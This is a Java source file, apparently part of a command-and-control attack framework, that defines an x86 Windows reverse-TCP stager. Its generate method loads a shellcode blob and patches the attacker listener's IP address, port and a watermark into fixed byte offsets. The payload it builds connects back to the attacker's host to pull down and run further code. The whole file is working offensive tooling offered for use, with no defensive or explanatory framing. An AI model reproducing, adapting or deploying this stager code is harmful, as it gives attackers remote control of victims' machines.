package stagers;

import common.CommonUtils;
import common.Listener;
import common.Packer;
import graph.Route;

public class ForeignReverseStagerX86
        extends GenericStager {
    public ForeignReverseStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String arch() {
        return "x86";
    }

    @Override
    public String payload() {
        return "windows/foreign/reverse_tcp";
    }

    @Override
    public byte[] generate() {
        String data = CommonUtils.bString(CommonUtils.readResource("resources/reverse.bin")) + this.getConfig().getWatermark();
        long myhost = Route.ipToLong(this.getListener().getHost());
        Packer packer = new Packer();
        packer.addInt((int) myhost);
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 197);
        packer = new Packer();
        packer.little();
        packer.addInt(1453503984);
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 229);
        packer = new Packer();
        packer.addShort(this.getListener().getPort());
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 204);
        return CommonUtils.toBytes(data);
    }
}

